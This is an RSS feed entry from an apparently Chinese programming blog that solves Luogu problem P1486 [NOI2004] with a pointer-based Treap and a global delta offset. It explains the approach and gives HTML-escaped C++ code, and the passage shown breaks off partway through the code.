            <guid isPermalink="true">http://cubicy.icu/2018/04/09/%E6%B4%9B%E8%B0%B7P1486%20[NOI2004]%E9%83%81%E9%97%B7%E7%9A%84%E5%87%BA%E7%BA%B3%E5%91%98/</guid>
            <title>洛谷:P1486 [NOI2004]郁闷的出纳员</title>
            <link>http://cubicy.icu/2018/04/09/%E6%B4%9B%E8%B0%B7P1486%20[NOI2004]%E9%83%81%E9%97%B7%E7%9A%84%E5%87%BA%E7%BA%B3%E5%91%98/</link>
            <category>Treap</category>
            <category>BST</category>
            <pubDate>Mon, 09 Apr 2018 22:23:00 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;原题地址:&lt;a href=&#34;https://www.luogu.org/problemnew/show/P1486&#34;&gt;https://www.luogu.org/problemnew/show/P1486&lt;/a&gt;  &lt;/p&gt;
&lt;h3 id=&#34;题目简述&#34;&gt;&lt;a href=&#34;#题目简述&#34; class=&#34;headerlink&#34; title=&#34;题目简述&#34;&gt;&lt;/a&gt;题目简述&lt;/h3&gt;&lt;p&gt;一个序列a，初始为空。&lt;br&gt;随时插入一个数，查询第k大，全体加，全体减。&lt;br&gt;但是如果任何数在任何时刻低于给定的下界MIN，则立即移除出序列。&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;思路&#34;&gt;&lt;a href=&#34;#思路&#34; class=&#34;headerlink&#34; title=&#34;思路&#34;&gt;&lt;/a&gt;思路&lt;/h3&gt;&lt;p&gt;插入，查询第k大，容易发现是BST题。于是上Treap。&lt;br&gt;全体加全体减暴力加肯定不行，考虑用变量delta储存变化情况。全体加n就是delta+&amp;#x3D;n（n为负就是减）&lt;br&gt;于是每个数实际的值是：树里储存该数的值+delta  ——①&lt;br&gt;减了之后可能会有数低于下界，查找最小的数判断是不是小于MIN，是的话删除，重复直到不再小于MIN。&lt;br&gt;注意新插入的数不应该受之前的加减影响，所以将一个数字num插入树中时，如果直接把num插入树中，就变成num+delta了。&lt;br&gt;实际应该插入的是num-delta，这样结合上文①，现在这个数实际的值就是num本身了。&lt;br&gt;提供一个指针实现的Treap，不推荐使用其实，调的时候快把我搞吐血。&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;代码&#34;&gt;&lt;a href=&#34;#代码&#34; class=&#34;headerlink&#34; title=&#34;代码&#34;&gt;&lt;/a&gt;代码&lt;/h3&gt;&lt;figure class=&#34;highlight cpp&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;93&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;94&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;95&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;96&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;97&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;98&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;99&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;100&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;101&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;102&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;103&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;104&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;105&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;106&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;107&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;108&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;109&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;110&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;111&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;112&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;113&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;114&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;115&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;116&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;117&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;118&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;119&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;120&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;121&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;122&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;123&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;124&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;125&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;126&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;127&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;128&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;129&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;130&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;131&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;132&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;133&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;134&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;135&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;136&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;137&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;138&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;139&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;140&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;141&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;142&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;143&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;144&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;145&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;146&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;147&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;148&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;149&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;150&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;151&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;152&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;153&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;154&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;155&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;156&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;157&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;158&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;159&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;160&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;161&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;iostream&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;cstdlib&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;cstring&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;cstdio&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;ctime&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;cctype&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;using&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;namespace&lt;/span&gt; std;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; MAXN=&lt;span class=&#34;number&#34;&gt;200010&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Node&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; d,rnd,size;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        Node *ch[&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;],*pa;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;pool[MAXN],*root;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; tot=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;function&#34;&gt;Node *&lt;span class=&#34;title&#34;&gt;newnode&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; d)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;    &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        Node *p=&amp;amp;pool[++tot];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        p-&amp;gt;d=d;p-&amp;gt;rnd=&lt;span class=&#34;built_in&#34;&gt;rand&lt;/span&gt;();p-&amp;gt;size=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        p-&amp;gt;ch[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;]=p-&amp;gt;ch[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]=&lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; p;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;inline&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;size&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(Node *p)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;    &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; p?p-&amp;gt;size:&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;update&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(Node *p)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;    &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        p-&amp;gt;size=&lt;span class=&#34;built_in&#34;&gt;size&lt;/span&gt;(p-&amp;gt;ch[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;])+&lt;span class=&#34;built_in&#34;&gt;size&lt;/span&gt;(p-&amp;gt;ch[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;])+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;rotate&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(Node *p,&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; t)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;    &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        Node *pa=p-&amp;gt;pa,*gp=pa-&amp;gt;pa,*son=p-&amp;gt;ch[t^&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        pa-&amp;gt;ch[t]=son;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(son)son-&amp;gt;pa=pa;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(gp)gp-&amp;gt;ch[pa==gp-&amp;gt;ch[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]]=p;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        p-&amp;gt;pa=gp;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        p-&amp;gt;ch[t^&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]=pa;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        pa-&amp;gt;pa=p;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(pa==root)root=p;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;update&lt;/span&gt;(pa);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;update&lt;/span&gt;(p);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;treap&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(Node *p)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;    &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt;(&lt;span class=&#34;literal&#34;&gt;true&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(p==root || p-&amp;gt;rnd &amp;gt;= p-&amp;gt;pa-&amp;gt;rnd)&lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;built_in&#34;&gt;rotate&lt;/span&gt;(p,p==p-&amp;gt;pa-&amp;gt;ch[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;insert&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(Node *r,Node *p)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;    &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(!r)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            root=p;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; f=(p-&amp;gt;d &amp;gt;= r-&amp;gt;d);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(!r-&amp;gt;ch[f])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            r-&amp;gt;ch[f]=p;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            p-&amp;gt;pa=r;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;built_in&#34;&gt;insert&lt;/span&gt;(r-&amp;gt;ch[f],p);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;update&lt;/span&gt;(r);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;function&#34;&gt;Node* &lt;span class=&#34;title&#34;&gt;find&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(Node *r,&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; x)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;    &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(x&amp;lt;=&lt;span class=&#34;built_in&#34;&gt;size&lt;/span&gt;(r-&amp;gt;ch[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;]))&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;find&lt;/span&gt;(r-&amp;gt;ch[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;],x);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(x==&lt;span class=&#34;built_in&#34;&gt;size&lt;/span&gt;(r-&amp;gt;ch[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;])+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;span 